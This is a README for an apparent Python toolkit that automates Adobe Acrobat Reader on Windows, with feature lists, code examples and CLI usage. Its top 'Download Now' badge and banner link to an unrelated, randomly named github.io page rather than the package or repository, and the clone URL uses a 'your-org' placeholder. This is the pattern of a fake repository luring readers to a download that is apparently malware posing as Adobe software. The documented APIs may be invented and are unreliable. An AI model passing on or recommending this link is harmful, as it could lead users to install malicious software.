# adobe-acrobat-reader-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://chamthjayanaka.github.io/adobe-site-7vb/)


[![Banner](banner.png)](https://chamthjayanaka.github.io/adobe-site-7vb/)


[![PyPI version](https://badge.fury.io/py/adobe-acrobat-reader-toolkit.svg)](https://badge.fury.io/py/adobe-acrobat-reader-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

> A Python toolkit for automating workflows, processing PDF files, and extracting data from documents managed through Adobe Acrobat Reader on Windows environments.

---

## Overview

**adobe-acrobat-reader-toolkit** is a developer-focused Python library that bridges your automation scripts with Adobe Acrobat Reader on Windows. It provides a clean, Pythonic interface for interacting with PDF documents — enabling you to extract text, parse metadata, automate printing workflows, and analyze document structure without manual intervention.

Whether you are building a document processing pipeline, a data extraction service, or a batch PDF management tool, this toolkit gives you the programmatic control you need over Adobe Reader on Windows.

---

## Features

- 📄 **PDF Text Extraction** — Extract raw text and structured content from single or batch PDF files
- 🔍 **Metadata Parsing** — Read document properties including author, creation date, page count, and PDF version
- 🖨️ **Print Workflow Automation** — Programmatically trigger Adobe Reader's print dialog or silent print to configured printers
- 📑 **Page-Level Analysis** — Inspect individual pages for dimensions, annotations, and embedded objects
- 🗂️ **Batch File Processing** — Queue and process large volumes of PDF documents with configurable concurrency
- 🪟 **Windows Process Management** — Launch, monitor, and gracefully close Adobe Acrobat Reader instances via COM or subprocess interfaces
- 📊 **Data Export** — Export extracted content to JSON, CSV, or plain text for downstream processing
- 🔗 **Adobe Reader DC / Acrobat Reader Lite Support** — Compatible with both the full Adobe Reader DC and the streamlined Acrobat Reader Lite builds on Windows

---

## Requirements

| Requirement | Version / Details |
|---|---|
| Python | 3.8 or higher |
| Operating System | Windows 10 / Windows 11 |
| Adobe Acrobat Reader | Reader DC or Acrobat Reader Lite (latest version recommended) |
| `pywin32` | >= 305 |
| `pdfplumber` | >= 0.9.0 |
| `pymupdf` (fitz) | >= 1.23.0 |
| `comtypes` | >= 1.2.0 |
| `click` | >= 8.0 (CLI interface) |

---

## Installation

### From PyPI

```bash
pip install adobe-acrobat-reader-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/adobe-acrobat-reader-toolkit.git
cd adobe-acrobat-reader-toolkit
pip install -e ".[dev]"
```

### Verify Installation

```bash
python -c "import acrobat_toolkit; print(acrobat_toolkit.__version__)"
```

> **Note:** This toolkit requires a locally installed copy of Adobe Acrobat Reader on your Windows machine. It does not bundle or distribute Adobe Reader itself.

---

## Quick Start

```python
from acrobat_toolkit import AcrobatReaderClient

# Initialize the client — auto-detects Adobe Reader installation on Windows
client = AcrobatReaderClient()

# Open a PDF and extract all text content
with client.open_document("C:/Documents/report.pdf") as doc:
    text = doc.extract_text()
    print(text[:500])

# Check detected Adobe Reader version
print(f"Detected Reader: {client.reader_version}")
# Output: Detected Reader: Adobe Acrobat Reader DC 23.006.20360
```

---

## Usage Examples

### 1. Extract Text from a PDF

```python
from acrobat_toolkit import PDFProcessor

processor = PDFProcessor()

# Extract text page by page
result = processor.extract_text(
    file_path="C:/Documents/invoice.pdf",
    page_range=(1, 5),       # Pages 1 through 5
    output_format="dict"     # Returns structured dict keyed by page number
)

for page_num, content in result.items():
    print(f"--- Page {page_num} ---")
    print(content)
```

---

### 2. Read PDF Metadata

```python
from acrobat_toolkit import PDFMetadataReader

reader = PDFMetadataReader()
meta = reader.get_metadata("C:/Documents/contract.pdf")

print(meta)
# {
#     "title": "Service Agreement 2024",
#     "author": "Legal Department",
#     "creator": "Microsoft Word",
#     "producer": "Adobe PDF Library 17.0",
#     "creation_date": "2024-03-15T09:22:00",
#     "page_count": 12,
#     "pdf_version": "1.7",
#     "file_size_kb": 248.4
# }
```

---

### 3. Batch Process a Folder of PDFs

```python
from acrobat_toolkit import BatchProcessor
from pathlib import Path

batch = BatchProcessor(max_workers=4)

results = batch.process_directory(
    directory=Path("C:/Documents/PDFs/"),
    operations=["extract_text", "read_metadata"],
    output_dir=Path("C:/Documents/Output/"),
    output_format="json",
    recursive=True
)

print(f"Processed: {results.success_count} files")
print(f"Failed:    {results.failure_count} files")
print(f"Skipped:   {results.skipped_count} files")
```

---

### 4. Automate Printing via Adobe Reader on Windows

```python
from acrobat_toolkit import PrintAutomation

printer = PrintAutomation()

# Silent print to a specific Windows printer
printer.print_document(
    file_path="C:/Documents/report.pdf",
    printer_name="HP LaserJet Pro M404dn",
    silent=True,         # Suppress Adobe Reader print dialog
    copies=2,
    page_range="1-3"
)

print("Print job submitted successfully.")
```

---

### 5. Detect Adobe Reader Installation on Windows

```python
from acrobat_toolkit.utils import detect_reader_installation

info = detect_reader_installation()

print(info)
# {
#     "installed": True,
#     "version": "23.006.20360",
#     "variant": "Adobe Acrobat Reader DC",
#     "install_path": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\",
#     "executable": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"
# }
```

---

### 6. Export Extracted Data to CSV

```python
from acrobat_toolkit import PDFProcessor, DataExporter

processor = PDFProcessor()
exporter = DataExporter()

# Extract structured table data from a PDF
tables = processor.extract_tables("C:/Reports/quarterly_data.pdf")

# Export to CSV
exporter.to_csv(
    data=tables,
    output_path="C:/Output/quarterly_data.csv",
    include_page_numbers=True
)

print("Export complete.")
```

---

## CLI Usage

The toolkit also ships with a command-line interface for quick operations without writing Python code.

```bash
# Extract text from a PDF
acrobat-toolkit extract-text --input report.pdf --output report.txt

# Read metadata from a PDF
acrobat-toolkit metadata --input contract.pdf --format json

# Batch process a directory
acrobat-toolkit batch --dir ./pdfs/ --operation extract_text --out ./output/

# Check Adobe Reader installation status
acrobat-toolkit check-install
```

---

## Project Structure

```
adobe-acrobat-reader-toolkit/
├── acrobat_toolkit/
│   ├── __init__.py
│   ├── client.py           # AcrobatReaderClient — core Windows COM interface
│   ├── processor.py        # PDFProcessor — text and table extraction
│   ├── metadata.py         # PDFMetadataReader
│   ├── batch.py            # BatchProcessor — concurrent file handling
│   ├── printing.py         # PrintAutomation — Windows print workflows
│   ├── exporter.py         # DataExporter — JSON, CSV, TXT output
│   └── utils/
│       ├── detection.py    # Adobe Reader install detection on Windows
│       └── windows.py      # Windows registry and process helpers
├── tests/
├── docs/
├── pyproject.toml
├── CHANGELOG.md
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. To get started:

1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature/your-feature-name`
3. **Write tests** for your changes under `tests/`
4. **Run the test suite**: `pytest tests/ -v`
5. **Format your code**: `black acrobat_toolkit/`
6. **Submit** a pull request with a clear description of the change

Please review [CONTRIBUTING.md](CONTRIBUTING.md) and our [Code of Conduct](CODE_OF_CONDUCT.md) before submitting.

### Reporting Issues

If you encounter a bug or unexpected behavior — especially related to specific Adobe Acrobat Reader versions on Windows 10 or Windows 11 — please open a [GitHub Issue](https://github.com/your-org/adobe-acrobat-reader-toolkit/issues) with:

- Your Windows version
- Your Adobe Reader version (`acrobat-toolkit check-install`)
- A minimal reproducible example

---

## License

This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for full details.

---

## Acknowledgements

This toolkit builds on the shoulders of excellent open-source libraries including [`pdfplumber`](https://github.com/jsvine/pdfplumber), [`PyMuPDF`](https://github.com/pymupdf/PyMuPDF), and [`pywin32`](https://github.com/mhammond/pywin32). Adobe, Adobe Reader, and Adobe Acrobat Reader DC are trademarks of Adobe Inc. This project is not affiliated with or endorsed by Adobe Inc.